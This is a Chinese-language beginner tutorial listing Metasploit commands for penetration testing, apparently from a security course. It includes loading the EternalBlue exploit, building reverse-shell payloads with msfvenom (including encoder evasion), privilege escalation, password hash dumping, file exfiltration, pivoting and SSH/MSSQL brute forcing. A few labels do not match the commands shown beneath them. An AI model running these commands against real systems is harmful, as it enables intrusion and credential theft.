---
order: 520
title: Cybersecurity Metasploit 命令(渗透测试)
module: 033-cybersecurity
category: '033-cybersecurity'
difficulty: beginner
description: Cybersecurity Metasploit 命令(渗透测试) 的完整教学讲解。
author: fanquanpp
updated: '2026-08-01'
related: []
prerequisites: []
---
## msfconsole 基础操作

**基本写法:启动 msfconsole**
`msfconsole`
```bash
# 启动 Metasploit 控制台
msfconsole -q
```

**基本写法:查看版本**
`version`
```bash
# 查看 Metasploit 版本
msfconsole -q -x "version"
```

**基本写法:查看模块统计**
`show <模块类型>`
```bash
# 查看各类型模块数量
show all
```

**基本写法:查看帮助**
`help <命令>`
```bash
# 查看指定命令帮助
help search
```

**基本写法:退出控制台**
`exit`
```bash
# 退出 msfconsole
exit
```

---

## 模块搜索与加载

**基本写法:搜索漏洞利用模块**
`search <关键字>`
```bash
# 搜索 SMB 相关利用模块
search name:smb type:exploit
```

**基本写法:按 CVE 搜索**
`search <CVE编号>`
```bash
# 按 CVE 编号搜索模块
search CVE-2021-44228
```

**基本写法:按平台搜索**
`search platform:<平台>`
```bash
# 搜索 Linux 平台模块
search platform:linux type:exploit
```

**基本写法:加载模块**
`use <模块路径>`
```bash
# 加载指定利用模块
use exploit/windows/smb/ms17_010_eternalblue
```

**基本写法:查看模块信息**
`info <模块路径>`
```bash
# 查看模块详细信息
info exploit/multi/handler
```

**基本写法:查看模块选项**
`show options`
```bash
# 查看当前模块的配置选项
show options
```

---

## 模块配置与执行

**基本写法:设置目标地址**
`set RHOSTS <目标IP>`
```bash
# 设置目标主机地址
set RHOSTS 192.168.1.10
```

**基本写法:设置本地监听地址**
`set LHOST <本机IP>`
```bash
# 设置反向连接监听地址
set LHOST 192.168.1.5
```

**基本写法:设置监听端口**
`set LPORT <端口>`
```bash
# 设置监听端口
set LPORT 4444
```

**基本写法:设置 Payload**
`set PAYLOAD <payload路径>`
```bash
# 设置反向 Meterpreter Payload
set PAYLOAD windows/meterpreter/reverse_tcp
```

**基本写法:执行模块**
`exploit`
```bash
# 执行当前加载的模块
exploit -j
```

**基本写法:设置目标编号**
`set TARGET <编号>`
```bash
# 设置目标系统类型编号
set TARGET 0
```

---

## Meterpreter 操作

**基本写法:查看系统信息**
`sysinfo`
```bash
# 查看目标系统信息
sysinfo
```

**基本写法:获取当前用户**
`getuid`
```bash
# 查看当前权限用户
getuid
```

**基本写法:提权**
`getsystem`
```bash
# 尝试提权到 SYSTEM
getsystem
```

**基本写法:执行系统命令**
`execute -f <命令> -i`
```bash
# 在目标执行命令
execute -f cmd.exe -i -H
```

**基本写法:下载文件**
`download <远程文件> <本地路径>`
```bash
# 从目标下载文件
download C:\\Users\\admin\\secret.txt /tmp/
```

**基本写法:上传文件**
`upload <本地文件> <远程路径>`
```bash
# 上传文件到目标
upload /tmp/payload.exe C:\\Users\\Public\\
```

**基本写法:截屏**
`screenshot`
```bash
# 截取目标屏幕
screenshot -p /tmp/screen.png
```

---

## 后渗透操作

**基本写法:获取密码哈希**
`hashdump`
```bash
# 导出系统密码哈希
hashdump
```

**基本写法:获取进程列表**
`ps`
```bash
# 列出目标进程
ps
```

**基本写法:迁移进程**
`migrate <PID>`
```bash
# 迁移到指定进程
migrate 1234
```

**基本写法:查看网络连接**
`netstat`
```bash
# 查看目标网络连接状态
netstat
```

**基本写法:路由添加**
`route add <子网> <掩码> <会话ID>`
```bash
# 通过 Meterpreter 会话添加路由
route add 192.168.2.0 255.255.255.0 1
```

**基本写法:建立 socks 代理**
`use auxiliary/server/socks4a`
```bash
# 加载 socks 代理模块用于内网穿透
use auxiliary/server/socks4a
set SRVHOST 127.0.0.1
set SRVPORT 1080
run -j
```

---

## 辅助模块使用

**基本写法:端口扫描**
`use auxiliary/scanner/portscan/tcp`
```bash
# 使用 TCP 端口扫描模块
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.10
set PORTS 1-1000
run
```

**基本写法:SMB 版本探测**
`use auxiliary/scanner/smb/smb_version`
```bash
# 探测 SMB 版本信息
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.10
run
```

**基本写法:SSH 登录爆破**
`use auxiliary/scanner/ssh/ssh_login`
```bash
# SSH 密码爆破模块
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.10
set USERNAME root
set PASS_FILE passwords.txt
run
```

**基本写法:HTTP 目录扫描**
`use auxiliary/scanner/http/dir_scanner`
```bash
# 扫描 Web 目录
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.1.10
set DICTIONARY /usr/share/wordlists/dirb/common.txt
run
```

**基本写法:数据库凭据收集**
`use auxiliary/scanner/mssql/mssql_login`
```bash
# MSSQL 登录测试模块
use auxiliary/scanner/mssql/mssql_login
set RHOSTS 192.168.1.10
set USERNAME sa
set PASSWORD admin123
run
```

---

## Payload 生成

**基本写法:生成反向 Payload**
`msfvenom -p <payload> LHOST=<IP> LPORT=<端口> -f <格式> -o <文件>`
```bash
# 生成 Windows 反向 Meterpreter Payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o payload.exe
```

**基本写法:生成 Linux Payload**
`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<端口> -f elf -o <文件>`
```bash
# 生成 Linux ELF 格式 Payload
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f elf -o payload.elf
```

**基本写法:生成 Python Payload**
`msfvenom -p python/meterpreter/reverse_tcp LHOST=<IP> LPORT=<端口> -f raw -o <文件>`
```bash
# 生成 Python 格式 Payload
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw -o payload.py
```

**基本写法:生成 Payload 时编码**
`msfvenom -p <payload> -e <编码器> -i <次数> LHOST=<IP> LPORT=<端口> -f <格式> -o <文件>`
```bash
# 使用 shikata_ga_nai 编码 5 次
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=192.168.1.5 LPORT=4444 -f exe -o payload.exe
```

**基本写法:生成 PHP Payload**
`msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> LPORT=<端口> -f php -o <文件>`
```bash
# 生成 PHP 格式 Payload
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f php -o payload.php
```

---

## 数据库操作

**基本写法:连接 PostgreSQL**
`db_connect <用户>:<密码>@<主机>/<数据库>`
```bash
# 连接 Metasploit 数据库
db_connect msf:msf@127.0.0.1/msf
```

**基本写法:查看数据库状态**
`db_status`
```bash
# 查看数据库连接状态
db_status
```

**基本写法:导入 nmap 扫描结果**
`db_import <XML文件>`
```bash
# 导入 nmap XML 扫描结果
db_import nmap_scan.xml
```

**基本写法:查看主机列表**
`hosts`
```bash
# 查看数据库中保存的主机
hosts
```

**基本写法:查看服务列表**
`services`
```bash
# 查看发现的服务
services
```

**基本写法:查看凭据**
`creds`
```bash
# 查看收集到的凭据
creds
```

---

## 资源脚本与自动化

**基本写法:执行资源脚本**
`resource <脚本文件>`
```bash
# 批量执行命令脚本
resource /tmp/commands.rc
```

**基本写法:创建资源脚本**
`echo "use auxiliary/scanner/portscan/tcp" > <脚本>`
```bash
# 创建自动化扫描脚本
cat > /tmp/scan.rc << 'EOF'
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 22,80,443
run
EOF
```

**基本写法:启动时执行脚本**
`msfconsole -r <脚本文件>`
```bash
# 启动时执行指定脚本
msfconsole -r /tmp/scan.rc
```

**基本写法:执行单条命令**
`msfconsole -x "<命令>"`
```bash
# 启动后执行单条命令
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.5; set LPORT 4444; run"
```

---

## 报告与会话管理

**基本写法:查看活跃会话**
`sessions -l`
```bash
# 列出所有 Meterpreter 会话
sessions -l
```

**基本写法:进入指定会话**
`sessions -i <ID>`
```bash
# 进入指定 ID 的会话
sessions -i 1
```

**基本写法:后台当前会话**
`background`
```bash
# 将当前会话转入后台
background
```

**基本写法:杀死会话**
`sessions -k <ID>`
```bash
# 终止指定会话
sessions -k 1
```

**基本写法:生成报告**
`msfd`
```bash
# 启动 Metasploit 守护进程服务
msfd -a 127.0.0.1 -p 7337
```

---

## Metasploit 模块更新

**基本写法:更新 Metasploit**
`msfupdate`
```bash
# 更新 Metasploit 框架
msfupdate
```

**基本写法:查看已加载插件**
`show plugins`
```bash
# 查看可用插件列表
load wiki
```

**基本写法:加载插件**
`load <插件名>`
```bash
# 加载 nessus 插件
load nessus
```

**基本写法:查看数据库工作空间**
`workspace`
```bash
# 查看与切换工作空间
workspace
workspace -a pentest
```

**基本写法:查看模块缓存**
`show module_paths`
```bash
# 查看模块加载路径
show module_paths
```

## 参考文献

OWASP Top 10：https://owasp.org/www-project-top-ten/
OWASP Cheat Sheets：https://cheatsheetseries.owasp.org/
NIST 网络安全框架：https://www.nist.gov/cyberframework
CWE 数据库：https://cwe.mitre.org/
PortSwigger Web Security Academy：https://portswigger.net/web-security

## 延伸阅读

密码学与证书，见 033-cybersecurity 模块文档。
Web 攻击与防御，见 033-cybersecurity 模块相关文档。
网络层安全，见 032-networking 模块。
黑马程序员 Bilibili 空间（https://space.bilibili.com/37974444 ）提供网络安全课程。

## 模块文档速查表

| 文档 | 主题 | 与本文的关联 |
| --- | --- | --- |
| 安全基础与防御 | 001-SecurityBasicsDefense | 本文的前置基础 |
| Web安全与渗透测试 | 002-WebSecurityPenetrationTesting | 本文的安全延伸 |
| 二进制安全与应急响应 | 003-BinarySecurityAndIncidentResponse | 本文的安全延伸 |
| 安全工具与实战 | 004-SecurityToolsPractice | 本文的综合应用 |
| XSS攻击 | 005-XSSAttack | 本文的并列主题 |
| 安全模型与框架 | 006-SecurityModelFramework | 本文的安全延伸 |
| CSRF攻击 | 007-CSRFAttack | 本文的并列主题 |
| 密码学应用 | 008-CryptographyApplication | 本文的并列主题 |
| Web安全深度 | 009-WebSecurityDeep | 本文的安全延伸 |
| 安全运营中心 | 010-SOC | 本文的安全延伸 |
| SSRF攻击 | 011-SSRFAttack | 本文的并列主题 |
| 恶意代码分析 | 012-MalwareAnalysis | 本文的并列主题 |
| 云安全 | 013-CloudSecurity | 本文的安全延伸 |
| 对称加密 | 014-SymmetricEncryption | 本文的安全延伸 |
| 应急响应 | 015-IncidentResponse | 本文的并列主题 |
| 非对称加密 | 016-AsymmetricEncryption | 本文的安全延伸 |
| 哈希算法 | 017-HashAlgorithm | 本文的并列主题 |
| 安全开发 | 018-SecureDevelopment | 本文的安全延伸 |
| 合规与审计 | 019-ComplianceAudit | 本文的并列主题 |
| 数字证书 | 020-DigitalCertificate | 本文的并列主题 |
| HTTPS原理 | 021-HTTPSPrinciple | 本文的原理深化 |
| 渗透测试方法论 | 022-PenetrationTestingMethodology | 本文的并列主题 |
| 信息收集 | 023-InformationGathering | 本文的并列主题 |
| 漏洞扫描 | 024-VulnerabilityScan | 本文的并列主题 |
| 安全编码原则 | 025-SecureCodingPrinciples | 本文的安全延伸 |
| 输入验证 | 026-InputValidation | 本文的并列主题 |
| 认证与授权 | 027-AuthenticationAuthorization | 本文的并列主题 |
| OWASP-Top-10详解 | 028-OWASPTop10Detailed | 本文的并列主题 |
| XXE攻击 | 029-XXEAttack | 本文的并列主题 |
| 反序列化漏洞 | 030-DeserializationVulnerability | 本文的并列主题 |
| 零信任架构 | 031-ZeroTrustArchitecture | 本文的原理深化 |
| 身份与访问管理 | 032-IdentityAccessManagement | 本文的并列主题 |
| 安全基线 | 033-SecurityBaseline | 本文的安全延伸 |
| 漏洞扫描工具 | 034-VulnerabilityScanTools | 本文的并列主题 |
| WAF规则 | 035-WAFRule | 本文的并列主题 |
| Cybersecurity OpenSSL 证书管理 | 036-OpenSSLCert | 本文的并列主题 |
| Cybersecurity OpenSSL 加密解密 | 037-OpenSSLEncrypt | 本文的安全延伸 |
| Cybersecurity nmap 端口扫描 | 038-NmapScan | 本文的并列主题 |
| Cybersecurity 哈希工具 | 039-HashTools | 本文的并列主题 |
| Cybersecurity hashcat 密码破解 | 040-Hashcat | 本文的并列主题 |
| Cybersecurity GPG 加密与签名 | 041-GPGEncrypt | 本文的安全延伸 |
| Cybersecurity SSH 密钥管理 | 042-SSHKeys | 本文的并列主题 |
| Cybersecurity 密码哈希 | 043-PasswordHash | 本文的并列主题 |
| Cybersecurity SQL 注入检测与防御 | 044-SQLInjection | 本文的并列主题 |
| Cybersecurity XSS 防御 | 045-XSSDefense | 本文的并列主题 |
| Cybersecurity CSRF 防御命令与配置 | 046-CSRFDefense | 本文的并列主题 |
| Cybersecurity XXE 防御与检测 | 047-XXEDefense | 本文的并列主题 |
| Cybersecurity 命令注入防御与检测 | 048-CommandInjection | 本文的并列主题 |
| Cybersecurity OAuth2/OIDC 配置命令 | 049-OAuth2OIDC | 本文的并列主题 |
| Cybersecurity 防火墙配置(ufw/firewalld) | 050-FirewallConfig | 本文的并列主题 |
| Cybersecurity IDS/IPS 命令(Suricata/Snort) | 051-IDSIPSCommands | 本文的并列主题 |
| Cybersecurity Metasploit 命令(渗透测试) | 052-MetasploitCommands | 本文自身 |
| Cybersecurity Burp Suite 命令行 | 053-BurpSuiteCLI | 本文的并列主题 |
| Cybersecurity Nikto Web 扫描 | 054-NiktoScan | 本文的并列主题 |
| Cybersecurity OpenVAS 漏洞扫描 | 055-OpenVASCommands | 本文的并列主题 |
| Cybersecurity SELinux/AppArmor 强制访问控制 | 056-SELinuxAppArmor | 本文的并列主题 |
| Cybersecurity AIDE 文件完整性检查 | 057-AIDEFileIntegrity | 本文的并列主题 |
| Cybersecurity auditd 审计命令 | 058-AuditdCommands | 本文的并列主题 |
| Cybersecurity 隐写术工具命令 | 059-SteganographyTools | 本文的并列主题 |
| Cybersecurity 逆向工程命令(radare2/ghidra CLI) | 060-ReverseEngineering | 本文的并列主题 |
